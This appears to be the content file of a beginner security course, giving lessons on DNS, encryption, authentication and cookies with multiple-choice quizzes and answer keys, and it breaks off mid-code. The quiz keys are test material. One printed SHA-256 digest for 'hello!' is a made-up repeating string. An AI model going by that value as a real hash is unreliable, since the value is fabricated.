        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "In the DNS hierarchy, what is the correct order from top to bottom?",
                "options": [
                    "TLD servers → Root servers → Authoritative servers",
                    "Authoritative servers → TLD servers → Root servers",
                    "Root servers → TLD servers → Authoritative servers",
                    "Resolver → Authoritative server → Root server"
                ],
                "correct_index": 2,
                "explanation": "DNS resolution starts at root servers (which point to TLD servers), then TLD servers (which point to authoritative servers), and finally authoritative servers (which provide the actual IP address)."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "What is DNS cache poisoning?",
                "options": [
                    "Adding too many records to a DNS server until it crashes",
                    "Corrupting cached DNS records to redirect users to malicious servers",
                    "Using DNS to slow down a website's loading speed",
                    "Encrypting DNS traffic to hide browsing history"
                ],
                "correct_index": 1,
                "explanation": "DNS cache poisoning involves inserting false DNS records into a resolver's cache. When users ask for a legitimate domain, they are redirected to an attacker-controlled server."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "What does an MX record do?",
                "options": [
                    "Maps a domain to an IP address",
                    "Specifies which server handles email for a domain",
                    "Creates an alias from one domain to another",
                    "Stores text data for domain verification"
                ],
                "correct_index": 1,
                "explanation": "MX (Mail Exchange) records specify which mail servers are responsible for receiving email for a domain. They include a priority number to indicate which server to use first."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What is DNSSEC designed to prevent?",
                "options": [
                    "Slow DNS lookups",
                    "DNS cache poisoning and record tampering",
                    "Websites from loading too many images",
                    "Users from changing their DNS settings"
                ],
                "correct_index": 1,
                "explanation": "DNSSEC adds cryptographic signatures to DNS records, allowing resolvers to verify that records have not been tampered with. This prevents cache poisoning attacks."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "Why might switching to a DNS provider like Quad9 (9.9.9.9) improve your security?",
                "options": [
                    "It makes your internet connection faster",
                    "It automatically blocks lookups for known malicious domains",
                    "It encrypts all your internet traffic",
                    "It prevents websites from tracking you with cookies"
                ],
                "correct_index": 1,
                "explanation": "Quad9 is a security-focused DNS provider that maintains a threat intelligence feed and automatically blocks DNS lookups for domains associated with malware, phishing, and botnets."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "What is TTL in the context of DNS?",
                "options": [
                    "Total Traffic Limit — the maximum number of queries a DNS server handles",
                    "Time To Live — how long a DNS record can be cached before re-fetching",
                    "Transfer Technology Layer — the protocol used between DNS servers",
                    "Trusted Transaction Log — a record of all DNS queries"
                ],
                "correct_index": 1,
                "explanation": "TTL (Time To Live) specifies how many seconds a DNS record can be cached. After the TTL expires, the resolver must query the authoritative server again for the latest record."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 4
    # =========================================================================
    {
        "slug": "how-encryption-works",
        "title": "How Encryption Works",
        "subtitle": "The science of keeping secrets in a digital world",
        "category": "Part 1: Foundations",
        "part_number": 1,
        "chapter_number": 4,
        "difficulty": "beginner",
        "estimated_minutes": 30,
        "intro_hook": (
            "Every time you see that little padlock icon in your browser, encryption "
            "is at work. It is the technology that lets you send credit card numbers, "
            "private messages, and sensitive data across the internet without anyone "
            "else reading it. Without encryption, the internet would be as secure "
            "as sending postcards through the mail."
        ),
        "key_takeaways": [
            "Encryption transforms readable data into unreadable code using mathematical algorithms",
            "Symmetric encryption uses one shared key, while asymmetric uses a public/private key pair",
            "Hashing creates a fixed-size fingerprint of data that cannot be reversed",
            "HTTPS uses a combination of asymmetric and symmetric encryption to secure web traffic"
        ],
        "vocabulary_json": [
            {"term": "Encryption", "definition": "The process of converting readable data (plaintext) into unreadable data (ciphertext) using a key and an algorithm."},
            {"term": "Decryption", "definition": "The reverse process — converting ciphertext back into readable plaintext."},
            {"term": "Symmetric Encryption", "definition": "Encryption where the same key is used to both encrypt and decrypt data."},
            {"term": "Asymmetric Encryption", "definition": "Encryption that uses a public key to encrypt and a private key to decrypt."},
            {"term": "Hashing", "definition": "A one-way transformation that converts data into a fixed-size string, like a digital fingerprint."},
            {"term": "Key", "definition": "A piece of information (a number or string) that controls how encryption and decryption work."}
        ],
        "sections": [
            {
                "title": "What Encryption Means",
                "content": (
                    "Encryption is the process of turning readable information "
                    "(called **plaintext**) into scrambled, unreadable data (called "
                    "**ciphertext**). Only someone with the right **key** can "
                    "unscramble it back into readable form.\n\n"
                    "Think of it like a secret language. Imagine you and a friend "
                    "agree that every letter will be replaced by the letter three "
                    "positions later in the alphabet. So \"HELLO\" becomes \"KHOOR\". "
                    "That is encryption. Your friend knows the rule (the key) and "
                    "can decode it. Anyone else sees only gibberish.\n\n"
                    "Modern encryption uses much more sophisticated math, but the "
                    "principle is the same: **transform data so that only authorized "
                    "people can read it**.\n\n"
                    "> Encryption does not hide the fact that you are communicating — "
                    "> it hides the **content** of that communication.\n\n"
                    "There are two main flavors of encryption:\n\n"
                    "- **Symmetric encryption**: One key encrypts, the same key decrypts\n"
                    "- **Asymmetric encryption**: A public key encrypts, a private key decrypts\n\n"
                    "Both are essential and serve different purposes. Let us explore each one."
                )
            },
            {
                "title": "Symmetric Encryption: One Key",
                "content": (
                    "**Symmetric encryption** uses a single key to both encrypt and "
                    "decrypt data. Both the sender and receiver must have the same "
                    "key.\n\n"
                    "Think of it like a shared house key. If you want your friend to "
                    "enter your house, you give them a copy of your key. The same "
                    "key locks and unlocks the door.\n\n"
                    "The most common symmetric algorithm today is **AES** (Advanced "
                    "Encryption Standard). AES comes in three key sizes:\n\n"
                    "- **AES-128**: 128-bit key (2^128 possible keys)\n"
                    "- **AES-192**: 192-bit key\n"
                    "- **AES-256**: 256-bit key (considered the gold standard)\n\n"
                    "To put 256-bit encryption in perspective: if every atom in the "
                    "observable universe were a computer trying keys, it would take "
                    "longer than the age of the universe to try them all.\n\n"
                    "```python\n"
                    "from cryptography.fernet import Fernet\n"
                    "\n"
                    "key = Fernet.generate_key()\n"
                    "cipher = Fernet(key)\n"
                    "\n"
                    "encrypted = cipher.encrypt(b\"Secret message\")\n"
                    "decrypted = cipher.decrypt(encrypted)\n"
                    "```\n\n"
                    "The **challenge** with symmetric encryption is key distribution. "
                    "How do you share the key securely in the first place? If you "
                    "send it over the internet, someone could intercept it. This "
                    "problem led to the invention of asymmetric encryption."
                )
            },
            {
                "title": "Asymmetric Encryption: Two Keys",
                "content": (
                    "**Asymmetric encryption** (also called public-key cryptography) "
                    "uses two mathematically related keys:\n\n"
                    "- A **public key** that you share with everyone\n"
                    "- A **private key** that you keep secret\n\n"
                    "Data encrypted with the public key can only be decrypted with "
                    "the private key, and vice versa.\n\n"
                    "Think of it like a mailbox with a mail slot. Anyone can drop "
                    "a letter through the slot (using the public key), but only "
    "the person with the mailbox key can open it and read the letters "
                    "(using the private key).\n\n"
                    "The most common asymmetric algorithms are **RSA** and **ECC** "
                    "(Elliptic Curve Cryptography).\n\n"
                    "> Asymmetric encryption solves the key distribution problem. "
                    "> You can publish your public key anywhere, and people can use "
                    "> it to send you encrypted messages that only you can read.\n\n"
                    "However, asymmetric encryption is **much slower** than symmetric "
                    "encryption — roughly 1,000 times slower. That is why real-world "
                    "systems like HTTPS use a clever combination of both."
                )
            },
            {
                "title": "Hashing: One-Way Transformation",
                "content": (
                    "**Hashing** is different from encryption because it is a "
                    "**one-way** operation. You cannot reverse a hash to get the "
                    "original data. It is like putting meat through a grinder — "
                    "you cannot turn ground meat back into a steak.\n\n"
                    "A hash function takes any input and produces a fixed-size "
                    "output called a **hash** or **digest**:\n\n"
                    "```python\n"
                    "import hashlib\n"
                    "\n"
                    "hash1 = hashlib.sha256(b\"hello\").hexdigest()\n"
                    "# Returns: 2cf24dba5fb0a30e26e83b2ac5b9e29e...\n"
                    "\n"
                    "hash2 = hashlib.sha256(b\"hello!\").hexdigest()\n"
                    "# Returns: ce0476c3b0b3b0b3b0b3b0b3b0b3b0b3...\n"
                    "```\n\n"
                    "Notice that changing **one character** in the input completely "
                    "changes the hash output. This is called the **avalanche effect**.\n\n"
                    "Key properties of a good hash function:\n\n"
                    "- **Deterministic**: The same input always produces the same hash\n"
                    "- **One-way**: You cannot reverse the hash to find the input\n"
                    "- **Collision-resistant**: It is practically impossible to find two different inputs that produce the same hash\n"
                    "- **Avalanche effect**: A small change in input creates a completely different hash\n\n"
                    "> Hashing is like a fingerprint. You cannot reconstruct a person "
                    "> from their fingerprint, but you can use it to verify identity.\n\n"
                    "The most common hash algorithms today are **SHA-256** and **SHA-3**. "
                    "Older algorithms like **MD5** and **SHA-1** are considered broken "
                    "because researchers have found ways to create collisions."
                )
            },
            {
                "title": "How Keys Are Exchanged",
                "content": (
                    "The key exchange problem is one of the most important challenges "
                    "in cryptography. How do two parties who have never met agree on "
                    "a secret key over an insecure network?\n\n"
                    "**The TLS Handshake (used in HTTPS)**\n\n"
                    "When your browser connects to a website, here is what happens:\n\n"
                    "1. The server sends its **public key** (along with a digital "
                    "certificate proving its identity)\n"
                    "2. Your browser generates a random **session key**\n"
                    "3. Your browser encrypts the session key with the server's "
                    "**public key**\n"
                    "4. The server decrypts it using its **private key**\n"
                    "5. Both sides now have the same session key and switch to fast "
                    "**symmetric encryption** for the rest of the session\n\n"
                    "> This is like meeting a stranger at a party. You use their "
                    "> public key to send them a secret, and then you both switch "
                    "> to a private conversation.\n\n"
                    "The digital certificate is crucial. It is issued by a "
                    "**Certificate Authority** (CA) — a trusted third party that "
                    "verifies the server's identity. Without certificates, you could "
                    "be encrypting with an attacker's public key instead of the "
                    "real server's.\n\n"
                    "Another key exchange method is **Diffie-Hellman**, which allows "
                    "two parties to agree on a shared secret over an insecure channel "
                    "without ever directly transmitting the key."
                )
            },
            {
                "title": "Why Encryption Matters for Security",
                "content": (
                    "Encryption is the foundation of almost every security system "
                    "on the internet:\n\n"
                    "**HTTPS (Web Security)**\n"
                    "Every website using HTTPS encrypts the communication between "
                    "your browser and the server. Without it, anyone on the same "
                    "Wi-Fi network (at a coffee shop, for example) could read your "
                    "passwords, messages, and data.\n\n"
                    "**End-to-End Encryption (Messaging)**\n"
                    "Apps like Signal and WhatsApp use end-to-end encryption so "
                    "that only the sender and receiver can read messages — not "
                    "even the company operating the app can access them.\n\n"
                    "**Data at Rest (Storage)**\n"
                    "Your phone encrypts its storage so that if it is stolen, the "
                    "thief cannot read your data without the passcode. Full-disk "
                    "encryption on laptops serves the same purpose.\n\n"
                    "**Password Storage**\n"
                    "Websites should never store passwords in plain text. Instead, "
                    "they store **hashed** versions (with salt) so that even if the "
                    "database is stolen, the actual passwords remain protected.\n\n"
                    "> Encryption is not a luxury — it is a necessity. Without it, "
                    "> the internet would be as insecure as sending postcards through "
                    "> the mail.\n\n"
                    "Key security practices:\n\n"
                    "- Always look for HTTPS (padlock icon) when entering sensitive data\n"
                    "- Use strong, unique passwords that cannot be brute-forced\n"
                    "- Enable encryption on all devices (phones, laptops, external drives)\n"
                    "- Never share private keys or passwords"
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "What is the key difference between symmetric and asymmetric encryption?",
                "options": [
                    "Symmetric is newer, asymmetric is older",
                    "Symmetric uses one shared key, asymmetric uses a public/private key pair",
                    "Symmetric only works with text, asymmetric works with images",
                    "Symmetric is used on the internet, asymmetric is not"
                ],
                "correct_index": 1,
                "explanation": "Symmetric encryption uses a single key for both encryption and decryption. Asymmetric encryption uses two related keys — a public key for encryption and a private key for decryption."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "Why is hashing considered a one-way operation?",
                "options": [
                    "It can only encrypt data but not decrypt it",
                    "It is mathematically impossible to reverse a hash to get the original input",
                    "It only works in one direction on the network",
                    "It requires only one key to operate"
                ],
                "correct_index": 1,
                "explanation": "Hashing transforms data into a fixed-size fingerprint. Unlike encryption, there is no key or method to reverse the process — you cannot reconstruct the original data from its hash."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "Why does HTTPS use both asymmetric and symmetric encryption?",
                "options": [
                    "Asymmetric is used for images, symmetric for text",
                    "Asymmetric is used to securely exchange a session key, then symmetric encryption is used for speed",
                    "Both are required by international law",
                    "Symmetric alone is not secure enough"
                ],
                "correct_index": 1,
                "explanation": "Asymmetric encryption is slow but solves the key distribution problem. HTTPS uses asymmetric encryption to securely exchange a session key, then switches to fast symmetric encryption for the actual data transfer."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What is the avalanche effect in hashing?",
                "options": [
                    "Hashes get larger as more data is added",
                    "A small change in input completely changes the hash output",
                    "Hashing becomes slower over time",
                    "Hashes can be reversed with enough computing power"
                ],
                "correct_index": 1,
                "explanation": "The avalanche effect means that even a tiny change in the input (like changing one character) produces a completely different hash. This makes hashes unpredictable and useful for security."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "What is a digital certificate used for in the TLS handshake?",
                "options": [
                    "To encrypt the user's password",
                    "To prove the server's identity and provide its public key",
                    "To generate a one-time password",
                    "To compress data before sending"
                ],
                "correct_index": 1,
                "explanation": "A digital certificate, issued by a Certificate Authority, proves that a server is who it claims to be. It contains the server's public key, which the browser uses to encrypt the session key."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "Why should websites never store passwords in plain text?",
                "options": [
                    "It uses too much storage space",
                    "If the database is stolen, attackers can read every user's password",
                    "Plain text passwords slow down the login process",
                    "Browsers cannot read plain text passwords"
                ],
                "correct_index": 1,
                "explanation": "If a plain text password database is stolen, attackers immediately have every user's password. By storing salted hashes, the actual passwords remain protected even if the database is compromised."
            },
            {
                "question_number": 7,
                "question_type": "multiple_choice",
                "question_text": "Which older hash algorithm is now considered broken and insecure?",
                "options": [
                    "SHA-256",
                    "SHA-3",
                    "MD5",
                    "AES-256"
                ],
                "correct_index": 2,
                "explanation": "MD5 (and SHA-1) are considered broken because researchers have demonstrated practical collision attacks — finding two different inputs that produce the same hash. SHA-256 and SHA-3 remain secure."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 5
    # =========================================================================
    {
        "slug": "how-authentication-works",
        "title": "How Authentication Works",
        "subtitle": "Proving who you are in a world of digital identities",
        "category": "Part 2: Web Security",
        "part_number": 2,
        "chapter_number": 5,
        "difficulty": "beginner",
        "estimated_minutes": 25,
        "intro_hook": (
            "Every time you log in to an account, you are performing "
            "authentication — proving to a computer system that you are who you "
            "claim to be. It sounds simple, but authentication is one of the most "
            "attacked parts of any system. Understanding how it works is the first "
            "step to understanding how to break it — and how to defend it."
        ),
        "key_takeaways": [
            "Authentication verifies identity using something you know, have, or are",
            "Passwords should be hashed and salted, never stored in plain text",
            "Multi-factor authentication adds critical layers of security",
            "Modern passkeys and biometrics are replacing traditional passwords"
        ],
        "vocabulary_json": [
            {"term": "Authentication", "definition": "The process of verifying that a user is who they claim to be."},
            {"term": "Authorization", "definition": "Determining what an authenticated user is allowed to do."},
            {"term": "Password Hashing", "definition": "Converting a password into a one-way hash for secure storage."},
            {"term": "Salt", "definition": "Random data added to a password before hashing to prevent rainbow table attacks."},
            {"term": "MFA", "definition": "Multi-Factor Authentication — requiring two or more different forms of verification."},
            {"term": "Passkey", "definition": "A modern, passwordless authentication method using cryptographic keys stored on your device."}
        ],
        "sections": [
            {
                "title": "Proving Who You Are",
                "content": (
                    "Authentication is based on one or more of three factors:\n\n"
                    "1. **Something you know** — a password, PIN, or security question\n"
                    "2. **Something you have** — a phone, hardware token, or smart card\n"
                    "3. **Something you are** — a fingerprint, face, or voice\n\n"
                    "The more factors you combine, the harder it is for an attacker "
                    "to impersonate you. This is the core principle behind "
                    "**Multi-Factor Authentication (MFA)**.\n\n"
                    "But before we get to MFA, let us understand how the simplest "
                    "form of authentication — passwords — actually works (and how "
                    "it frequently goes wrong).\n\n"
                    "> Authentication is different from **authorization**. "
                    "> Authentication asks \"Who are you?\" Authorization asks "
                    "> \"What are you allowed to do?\" You must authenticate before "
                    "> you can be authorized.\n\n"
                    "When you log in to a website, here is what happens behind the "
                    "scenes:\n\n"
                    "1. You enter your username and password\n"
                    "2. The server receives your credentials\n"
                    "3. The server hashes your password and compares it to the stored hash\n"
                    "4. If they match, the server creates a **session** and lets you in\n"
                    "5. If they do not match, the login fails\n\n"
                    "The critical security question is: how does the server store "
                    "your password? The answer to that question determines whether "
                    "a data breach exposes your credentials."
                )
            },
            {
                "title": "Passwords: The First Line",
                "content": (
                    "Passwords are the most common form of authentication, and "
                    "unfortunately, the most commonly abused. Here is what you need "
                    "to know.\n\n"
                    "**Why People Choose Bad Passwords**\n"
                    "Studies consistently show the most popular passwords include:\n"
                    "`123456`, `password`, `qwerty`, and `abc123`. People choose "
                    "these because they are easy to remember. But \"easy to remember\" "
                    "also means \"easy to guess.\"\n\n"
                    "**How Attackers Crack Passwords**\n\n"
                    "- **Brute force**: Trying every possible combination\n"
                    "- **Dictionary attacks**: Using lists of common passwords and words\n"
                    "- **Credential stuffing**: Using leaked username/password pairs from other breaches\n"
                    "- **Rainbow tables**: Pre-computed hash lookups for common passwords\n\n"
                    "> A strong password is like a strong lock. A 4-digit PIN can be "
                    "> cracked in minutes. A 16-character passphrase with mixed "
                    "> characters would take centuries.\n\n"
                    "**Creating Strong Passwords**\n\n"
                    "The best approach today is to use a **password manager** that "
                    "generates and stores random, unique passwords for every account. "
                    "You only need to remember one strong master password.\n\n"
                    "If you prefer memorable passwords, use **passphrases** — "
                    "strings of random words like `correct-horse-battery-staple`. "
                    "They are long, hard to crack, and surprisingly easy to remember."
                )
            },
            {
                "title": "Password Hashing: Storing Secrets",
                "content": (
                    "Good security practice dictates that servers **never store "
                    "plain-text passwords**. Instead, they store a **hash** of the "
                    "password.\n\n"
                    "When you create an account with password `MyP@ssw0rd!`, the "
                    "server does not save that string. Instead, it computes a hash "
                    "like `9f86d08...` and stores that. When you log in later, it "
                    "hashes your input again and compares the result to the stored "
                    "hash.\n\n"
                    "**Adding Salt**\n"
                    "Hashing alone is not enough. If two users have the same "
                    "password, their hashes would be identical. Attackers use "
                    "**rainbow tables** — pre-computed hashes of millions of common "
                    "passwords — to quickly reverse hashes.\n\n"
                    "A **salt** is a random string added to each password before "
                    "hashing:\n\n"
                    "```python\n"
                    "import hashlib, os\n"
                    "\n"
                    "password = \"MyP@ssw0rd!\"\n"
                    "salt = os.urandom(16)\n"
                    "hashed = hashlib.pbkdf2_hmac(\n"
                    "    'sha256',\n"
                    "    password.encode(),\n"
                    "    salt,\n"
                    "    100000\n"
                    ")\n"
                    "```\n\n"
                    "Now even if two users have the same password, their stored "
                    "hashes are different because their salts are different.\n\n"
                    "Modern password hashing functions like **bcrypt**, **scrypt**, "
                    "and **Argon2** are designed to be intentionally slow. This "
                    "makes brute-force attacks impractical — each guess takes "
                    "longer to compute.\n\n"
                    "> Think of salt like a unique spice added to each dish. Even "
                    "> if two people order the same meal, the salt makes each plate "
                    "> taste different."
                )
            },
            {
                "title": "Multi-Factor Authentication",
                "content": (
                    "**Multi-Factor Authentication (MFA)** adds extra layers of "
                    "security beyond just a password. Even if an attacker steals "
                    "your password, they still cannot log in without the additional "
                    "factor(s).\n\n"
                    "Common MFA methods:\n\n"
                    "**SMS Codes**\n"
                    "A one-time code sent to your phone via text message. The "
                    "attacker would need to steal your SIM card or intercept your "
                    "SMS to use it.\n\n"
                    "> SMS-based MFA is better than nothing, but it is vulnerable "
                    "> to SIM-swapping attacks where an attacker tricks your carrier "
                    "> into transferring your phone number.\n\n"
                    "**Authenticator Apps**\n"
                    "Apps like Google Authenticator or Authy generate time-based "
                    "one-time passwords (TOTP) that change every 30 seconds. "
                    "These are more secure than SMS because they are generated "
                    "on your device, not sent over the network.\n\n"
                    "**Hardware Security Keys**\n"
                    "Physical devices like **YubiKey** that you plug into your "
                    "computer or tap on your phone. They use the **FIDO2/WebAuthn** "
                    "standard and are considered the most secure MFA option. "
                    "They are phishing-resistant because they verify the website's "
                    "identity.\n\n"
                    "**Push Notifications**\n"
                    "Services like Duo send a push notification to your phone. "
                    "You simply tap \"Approve\" or \"Deny.\"\n\n"
                    "MFA is one of the single most effective security measures "
                    "you can enable. Google reports that MFA blocks **99% of "
                    "automated attacks**."
                )
            },
            {
                "title": "Biometrics and Passkeys",
                "content": (
                    "The future of authentication is moving beyond passwords "
                    "toward more natural, secure methods.\n\n"
                    "**Biometrics**\n"
                    "Your fingerprint, face, or iris are unique to you. Biometric "
                    "authentication uses these physical traits to verify your "
                    "identity. Your phone already uses Face ID or fingerprint "
                    "scanning to unlock.\n\n"
                    "Biometrics are convenient but have a limitation: you cannot "
                    "\"change\" your fingerprint if it is compromised. This is why "
                    "biometrics are often used as a **convenience layer** — your "
                    "phone uses biometrics to unlock the stored passkey, not as "
                    "the sole authentication factor.\n\n"
                    "**Passkeys**\n"
                    "Passkeys are the most exciting development in authentication. "
                    "They use **public-key cryptography** (the same concept from "
                    "the encryption chapter) to replace passwords entirely.\n\n"
                    "Here is how passkeys work:\n\n"
                    "1. Your device generates a **private key** (stored securely "
                    "on your device) and a **public key** (sent to the website)\n"
                    "2. When you log in, the website sends a challenge\n"
                    "3. Your device signs the challenge with the private key\n"
                    "4. The website verifies the signature with the public key\n\n"
                    "> Passkeys are like having a unique, unforgeable key for every "
                    "> website. There is no password to steal, no code to intercept, "
                    "> and nothing to remember.\n\n"
                    "Passkeys are supported by major platforms including Apple, "
                    "Google, and Microsoft. They are phishing-resistant because "
                    "your device will only sign challenges for the correct website."
                )
            },
            {
                "title": "Common Authentication Attacks",
                "content": (
                    "Understanding how attacks work helps you defend against them. "
                    "Here are the most common authentication attacks:\n\n"
                    "**Brute Force Attacks**\n"
                    "Attackers try every possible password combination. Countermeasures "
                    "include account lockouts, rate limiting, and CAPTCHAs.\n\n"
                    "**Credential Stuffing**\n"
                    "Attackers take leaked username/password pairs from one breach "
                    "and try them on other websites. This works because people reuse "
                    "passwords. The solution: use unique passwords for every account.\n\n"
                    "**Phishing**\n"
                    "Attackers send fake emails or create fake login pages that look "
                    "identical to real ones. When you enter your credentials, the "
                    "attacker captures them. MFA (especially hardware keys) is the "
                    "best defense.\n\n"
                    "**Session Hijacking**\n"
                    "Instead of stealing your password, attackers steal your "
                    "**session token** — the cookie that proves you are logged in. "
                    "We will cover this in depth in the next chapter.\n\n"
                    "**Keylogging**\n"
                    "Malware that records your keystrokes, capturing passwords as "
                    "you type them. Keeping your device updated and using reputable "
                    "security software helps prevent this.\n\n"
                    "> The strongest defense against all these attacks is combining "
                    "> unique passwords, MFA, and awareness. No single measure is "
                    "> perfect, but together they create a formidable barrier."
                )
            }
        ],
        "quizzes": [
            {
                "question_number": 1,
                "question_type": "multiple_choice",
                "question_text": "What are the three factors used in authentication?",
                "options": [
                    "Username, password, and email",
                    "Something you know, something you have, and something you are",
                    "A key, a lock, and a code",
                    "Encryption, hashing, and signing"
                ],
                "correct_index": 1,
                "explanation": "The three authentication factors are: something you know (password, PIN), something you have (phone, hardware token), and something you are (fingerprint, face). MFA combines multiple factors."
            },
            {
                "question_number": 2,
                "question_type": "multiple_choice",
                "question_text": "Why is a salt added to passwords before hashing?",
                "options": [
                    "To make the password shorter and easier to store",
                    "To make the hash output look more random for aesthetic reasons",
                    "To ensure that identical passwords produce different hashes, preventing rainbow table attacks",
                    "To compress the hash data for faster storage"
                ],
                "correct_index": 2,
                "explanation": "A salt is a random string added to each password before hashing. It ensures that even if two users have the same password, their stored hashes are different, making rainbow table attacks ineffective."
            },
            {
                "question_number": 3,
                "question_type": "multiple_choice",
                "question_text": "Why is an authenticator app (like Google Authenticator) more secure than SMS for MFA?",
                "options": [
                    "Authenticator apps are free while SMS costs money",
                    "Authenticator apps use stronger encryption algorithms",
                    "Authenticator codes are generated on your device and not transmitted over the network, making them harder to intercept",
                    "Authenticator apps work without an internet connection, making them more reliable"
                ],
                "correct_index": 2,
                "explanation": "Authenticator apps generate TOTP codes locally on your device. SMS codes are transmitted over the cellular network and can be intercepted through SIM-swapping or network attacks."
            },
            {
                "question_number": 4,
                "question_type": "multiple_choice",
                "question_text": "What makes passkeys more secure than traditional passwords?",
                "options": [
                    "Passkeys are longer and harder to type",
                    "Passkeys use public-key cryptography, so there is no password to steal or phish",
                    "Passkeys are stored in plain text on the server",
                    "Passkeys only work on specific operating systems"
                ],
                "correct_index": 1,
                "explanation": "Passkeys use public-key cryptography. Your device holds a private key that never leaves it. The server only has the public key, so even if the server is breached, there is no password to steal."
            },
            {
                "question_number": 5,
                "question_type": "multiple_choice",
                "question_text": "What is credential stuffing?",
                "options": [
                    "Adding extra characters to a password to make it longer",
                    "Using leaked username/password pairs from one breach to try on other websites",
                    "Storing credentials in an encrypted database",
                    "Adding a second factor to authentication"
                ],
                "correct_index": 1,
                "explanation": "Credential stuffing exploits the fact that people reuse passwords. Attackers take leaked credentials from one breach and try them on other services. Using unique passwords for every account prevents this."
            },
            {
                "question_number": 6,
                "question_type": "multiple_choice",
                "question_text": "What is the difference between authentication and authorization?",
                "options": [
                    "They are the same thing",
                    "Authentication verifies who you are; authorization determines what you can do",
                    "Authentication uses passwords; authorization uses biometrics",
                    "Authentication happens on the client; authorization happens on the network"
                ],
                "correct_index": 1,
                "explanation": "Authentication answers 'Who are you?' by verifying your identity. Authorization answers 'What are you allowed to do?' by checking permissions. You must authenticate before you can be authorized."
            }
        ]
    },

    # =========================================================================
    # CHAPTER 6
    # =========================================================================
    {
        "slug": "how-sessions-and-cookies-work",
        "title": "How Sessions and Cookies Work",
        "subtitle": "Why websites remember you — and how attackers exploit it",
        "category": "Part 2: Web Security",
        "part_number": 2,
        "chapter_number": 6,
        "difficulty": "beginner",
        "estimated_minutes": 25,
        "intro_hook": (
            "You log in to your email, close the browser, come back an hour later, "
            "and you are still logged in. How does the website remember you? The "
            "answer involves small text files called cookies and server-side "
            "sessions. Understanding how these work is crucial because they are "
            "one of the primary targets for web attackers."
        ),
        "key_takeaways": [
            "HTTP is stateless — cookies and sessions work together to maintain your login state",
            "Session tokens in cookies prove you are logged in and must be protected",
            "Session hijacking allows attackers to impersonate you without knowing your password",
            "Secure cookie flags (HttpOnly, Secure, SameSite) are essential defenses"
        ],
        "vocabulary_json": [
            {"term": "Cookie", "definition": "A small piece of data stored in your browser that websites send with every request to identify you."},
            {"term": "Session", "definition": "A temporary state on the server that tracks your activity while you are logged in."},
            {"term": "Session Token", "definition": "A unique, random string that identifies your session and is stored in a cookie."},
            {"term": "Stateless Protocol", "definition": "A protocol where each request is independent — the server does not remember previous requests."},
            {"term": "Session Hijacking", "definition": "An attack where an attacker steals a session token to impersonate a user."},
            {"term": "SameSite Cookie", "definition": "A cookie attribute that controls whether cookies are sent with cross-origin requests."}
        ],
        "sections": [
            {
                "title": "Why Websites Forget You",
                "content": (
                    "The internet runs on **HTTP** (HyperText Transfer Protocol), "
                    "and HTTP is **stateless**. This means that every request your "
                    "browser makes is completely independent. The server does not "
                    "\"remember\" that the previous request was yours.\n\n"
                    "Imagine talking to someone with severe amnesia. Every time you "
                    "speak, they have no memory of your previous conversation. You "
                    "would need to show them an ID card every single time. That is "
                    "exactly how the web works.\n\n"
                    "This creates a problem: how do you log in to a website and stay "
                    "logged in as you click from page to page? The answer is "
                    "**cookies and sessions**.\n\n"
                    "Here is the high-level flow:\n\n"
                    "1. You log in with your username and password\n"
                    "2. The server creates a **session** (stored on the server) and "
                    "generates a random **session token**\n"
                    "3. The server sends the session token to your browser in a **cookie**\n"
                    "4. Your browser automatically includes this cookie with every "
                    "subsequent request\n"
                    "5. The server reads the cookie, looks up your session, and "
                    "knows who you are\n\n"
                    "> Cookies are like the wristband you get at a concert. The "
                    "> venue staff do not remember your face, but they recognize "
                    "> the wristband and know you have paid admission."
                )
            },
            {
                "title": "Cookies: Small Tokens of Identity",
                "content": (
                    "A **cookie** is a small piece of data (typically under 4KB) "
                    "that a website stores in your browser. With every request to "
                    "that website, your browser automatically includes the cookie.\n\n"
                    "Here is what a Set-Cookie header looks like:\n\n"
                    "```http\n"
                    "Set-Cookie: session_id=abc123def456; Path=/; HttpOnly; Secure\n"
                    "```\n\n"
                    "Key cookie attributes:\n\n"
                    "- **Name/Value**: The actual data (e.g., `session_id=abc123def456`)\n"
                    "- **Path**: Which URLs the cookie applies to\n"
                    "- **Domain**: Which domain the cookie belongs to\n"
                    "- **Expires/Max-Age**: When the cookie should be deleted\n"
                    "- **HttpOnly**: If true, JavaScript cannot access this cookie\n"
                    "- **Secure**: If true, the cookie is only sent over HTTPS\n"
                    "- **SameSite**: Controls cross-origin cookie behavior\n\n"
                    "**Types of Cookies**\n\n"
                    "**Session cookies** disappear when you close your browser. "
                    "**Persistent cookies** have an expiration date and survive "
                    "browser restarts.\n\n"
                    "**First-party cookies** are set by the website you are visiting. "
                    "**Third-party cookies** are set by other domains (often used "
                    "for advertising tracking). Note: third-party cookies are being "
                    "phased out by major browsers for privacy reasons.\n\n"
                    "> Not all cookies are for login sessions. Cookies also store "
                    "> your preferences (like dark mode), shopping cart items, and "
                    "> tracking data for analytics."
                )
            },
            {
                "title": "Session Management Explained",
                "content": (
                    "While cookies live in your browser, **sessions** live on the "
                    "server. A session is a server-side record of your activity.\n\n"
                    "When you log in, the server:\n\n"
                    "1. Creates a new session with a unique ID (like `a1b2c3d4e5f6`)\n"
                    "2. Stores session data: your user ID, preferences, permissions\n"
                    "3. Sends the session ID to your browser in a cookie\n\n"
                    "```python\n"
                    "# Server-side (simplified)\n"
                    "session[\"user_id\"] = 42\n"
                    "session[\"role\"] = \"admin\"\n"
                    "session[\"login_time\"] = \"2024-01-15T10:30:00\"\n"
                    "```\n\n"
                    "On subsequent requests, the server reads the session ID from "
                    "the cookie and looks up the session data:\n\n"
                    "```python\n"
                    "session_id = request.cookies.get(\"session_id\")\n"
                    "session = session_store.get(session_id)\n"
